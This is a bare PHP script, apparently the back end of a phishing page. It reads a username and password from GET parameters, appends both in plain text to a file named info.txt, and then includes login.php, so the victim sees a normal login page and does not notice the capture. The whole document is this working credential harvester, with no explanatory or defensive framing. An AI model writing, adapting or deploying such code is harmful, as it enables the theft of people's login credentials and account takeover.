 <?php
 $doc=fopen("info.txt","a");
 $us="username: ".$_GET["un"]." ";
 $ps="password: ".$_GET["pw"]."\n";
 fwrite($doc,$us);
 fwrite($doc,$ps);
 fclose($doc); 
 include "login.php"
?>
